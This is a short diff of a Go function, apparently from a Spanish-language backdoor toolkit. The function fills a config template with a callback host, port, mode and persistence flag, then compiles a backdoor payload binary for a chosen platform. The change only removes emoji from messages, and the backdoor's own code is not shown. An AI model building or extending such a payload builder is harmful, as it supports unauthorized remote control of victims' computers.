@@ -11,7 +11,7 @@ import (
 func BuildPayload(outputPath, targetOS, targetArch, host, port, mode string, enablePersistence bool) error {
 	// Asegura que la carpeta destino exista
 	if err := os.MkdirAll(filepath.Dir(outputPath), 0755); err != nil {
-		return fmt.Errorf("❌ No se pudo crear carpeta destino: %v", err)
+		return fmt.Errorf(" No se pudo crear carpeta destino: %v", err)
 	}
 
 	// Ruta relativa desde builder.go hacia el backdoor
@@ -22,7 +22,7 @@ func BuildPayload(outputPath, targetOS, targetArch, host, port, mode string, ena
 	// Leer plantilla
 	template, err := os.ReadFile(configTemplatePath)
 	if err != nil {
-		return fmt.Errorf("❌ No se pudo leer la plantilla: %v", err)
+		return fmt.Errorf(" No se pudo leer la plantilla: %v", err)
 	}
 
 	// Reemplazo de variables
@@ -35,7 +35,7 @@ func BuildPayload(outputPath, targetOS, targetArch, host, port, mode string, ena
 	// Escribir config.go
 	err = os.WriteFile(configOutPath, []byte(content), 0644)
 	if err != nil {
-		return fmt.Errorf("❌ Error escribiendo config.go: %v", err)
+		return fmt.Errorf(" Error escribiendo config.go: %v", err)
 	}
 
 	// Ejecutar build
@@ -50,18 +50,18 @@ func BuildPayload(outputPath, targetOS, targetArch, host, port, mode string, ena
 	out, err := cmd.CombinedOutput()
 	fmt.Println("📦 Salida del build:\n", string(out))
 	if err != nil {
-		return fmt.Errorf("❌ Falló la compilación:\n%s\nDetalles: %v", string(out), err)
+		return fmt.Errorf(" Falló la compilación:\n%s\nDetalles: %v", string(out), err)
 	}
 
 	// Validar el binario
 	info, err := os.Stat(outputPath)
 	if err != nil {
-		return fmt.Errorf("❌ Binario no encontrado: %v", err)
+		return fmt.Errorf("Binario no encontrado: %v", err)
 	}
 	if info.Size() < 500_000 {
-		return fmt.Errorf("❌ Binario muy pequeño (%d bytes)", info.Size())
+		return fmt.Errorf(" Binario muy pequeño (%d bytes)", info.Size())
 	}
 
-	fmt.Println("✅ Payload generado en:", outputPath)
+	fmt.Println(" Payload generado en:", outputPath)
 	return nil
 }
